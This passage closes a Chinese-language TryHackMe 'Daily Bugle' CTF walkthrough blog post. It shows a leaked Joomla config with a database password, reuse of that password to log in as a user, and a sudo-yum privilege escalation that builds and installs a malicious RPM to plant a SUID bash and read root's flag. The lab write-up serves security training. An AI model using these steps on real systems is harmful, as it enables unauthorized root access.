class="hljs-variable">$display_offline_message</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        public <span class="hljs-variable">$offline_image</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$sitename</span> = <span class="hljs-string">&#x27;The Daily Bugle&#x27;</span>;<br>        public <span class="hljs-variable">$editor</span> = <span class="hljs-string">&#x27;tinymce&#x27;</span>;<br>        public <span class="hljs-variable">$captcha</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$list_limit</span> = <span class="hljs-string">&#x27;20&#x27;</span>;<br>        public <span class="hljs-variable">$access</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        public <span class="hljs-variable">$debug</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$debug_lang</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$dbtype</span> = <span class="hljs-string">&#x27;mysqli&#x27;</span>;<br>        public <span class="hljs-variable">$host</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br>        public <span class="hljs-variable">$user</span> = <span class="hljs-string">&#x27;root&#x27;</span>;<br>        public <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;nv5uz9r3ZEDzVjNu&#x27;</span>;<br>        public <span class="hljs-variable">$db</span> = <span class="hljs-string">&#x27;joomla&#x27;</span>;<br>        public <span class="hljs-variable">$dbprefix</span> = <span class="hljs-string">&#x27;fb9j5_&#x27;</span>;<br>        public <span class="hljs-variable">$live_site</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$secret</span> = <span class="hljs-string">&#x27;UAMBRWzHO3oFPmVC&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>可以用该密码直接切换到jjameson：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">[jjameson@dailybugle home]$ sudo  -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> jjameson on dailybugle:<br>    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,<br>    env_reset, env_keep=<span class="hljs-string">&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;</span>,<br>    env_keep+=<span class="hljs-string">&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;</span>,<br>    env_keep+=<span class="hljs-string">&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;</span>,<br>    env_keep+=<span class="hljs-string">&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;</span>,<br>    env_keep+=<span class="hljs-string">&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;</span>,<br>    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin<br><br>User jjameson may run the following commands on dailybugle:<br>    (ALL) NOPASSWD: /usr/bin/yum<br>[jjameson@dailybugle home]$ <br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220721110803049.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220721110803049"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HTB$ TF=$(<span class="hljs-built_in">mktemp</span> -d)<br>                                                                                                                                                                                                                                               <br>Crazyinside:~/HTB$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;cp /bin/bash /tmp &amp;&amp; chmod +s /tmp/bash&#x27;</span> &gt; <span class="hljs-variable">$TF</span>/x.sh<br>                                                                                                                                                                                                                                               <br>Crazyinside:~/HTB$ fpm -n x -s <span class="hljs-built_in">dir</span> -t rpm -a all --before-install <span class="hljs-variable">$TF</span>/x.sh <span class="hljs-variable">$TF</span><br>Created package &#123;:path=&gt;<span class="hljs-string">&quot;x-1.0-1.noarch.rpm&quot;</span>&#125;<br>                                                                                                                                                                                                                                               <br>Crazyinside:~/HTB$ <span class="hljs-built_in">ls</span><br>42033.txt  Daily  <span class="hljs-built_in">hash</span>  joomblah.py  MosaicTheory.ovpn  x-1.0-1.noarch.rpm<br>                                                                                                                                                                                                                                               <br>Crazyinside:~/HTB$ sudo python -m http.server 80<br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">[jjameson@dailybugle ~]$ sudo yum localinstall -y x-1.0-1.noarch.rpm<br>已加载插件：fastestmirror<br>正在检查 x-1.0-1.noarch.rpm: x-1.0-1.noarch<br>x-1.0-1.noarch.rpm 将被安装<br>正在解决依赖关系<br>--&gt; 正在检查事务<br>---&gt; 软件包 x.noarch.0.1.0-1 将被 安装<br>--&gt; 解决依赖关系完成<br><br>依赖关系解决<br><br>===============================================================================================================================================================================================================================================<br> Package                                             架构                                                     版本                                                     源                                                                 大小<br>===============================================================================================================================================================================================================================================<br>正在安装:<br> x                                                   noarch                                                   1.0-1                                                    /x-1.0-1.noarch                                                    40  <br><br>事务概要<br>===============================================================================================================================================================================================================================================<br>安装  1 软件包<br><br>总计：40  <br>安装大小：40  <br>Downloading packages:<br>Running transaction check<br>Running transaction <span class="hljs-built_in">test</span><br>Transaction <span class="hljs-built_in">test</span> succeeded<br>Running transaction<br>  正在安装    : x-1.0-1.noarch                                                                                                                                                                                                             1/1 <br>  验证中      : x-1.0-1.noarch                                                                                                                                                                                                             1/1 <br><br>已安装:<br>  x.noarch 0:1.0-1                                                                                                                                                                                                                             <br><br>完毕！<br>[jjameson@dailybugle ~]$ <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[jjameson@dailybugle ~]$ <span class="hljs-built_in">cd</span> /tmp/<br>[jjameson@dailybugle tmp]$ <span class="hljs-built_in">ls</span><br>bash<br>[jjameson@dailybugle tmp]$ ./bash -p<br>bash-4.2<span class="hljs-comment"># id</span><br>uid=1000(jjameson) gid=1000(jjameson) euid=0(root) egid=0(root) 组=0(root),1000(jjameson)<br>bash-4.2<span class="hljs-comment"># cat /root/root.txt</span><br>ee.................................<br>bash-4.2<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/TryHackMe/" class="category-chain-item">TryHackMe</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Tryhackme-Daily Bugle</div>
+      <div>http://example.com/2022/10/06/Tryhackme-Daily-Bugle/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Crazyinside</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Union/" title="HackTheBox-Union">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox-Union</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/Tryhackme-HackPark/" title="Tryhackme-HackPark">
+                        <span class="hidden-mobile">Tryhackme-HackPark</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
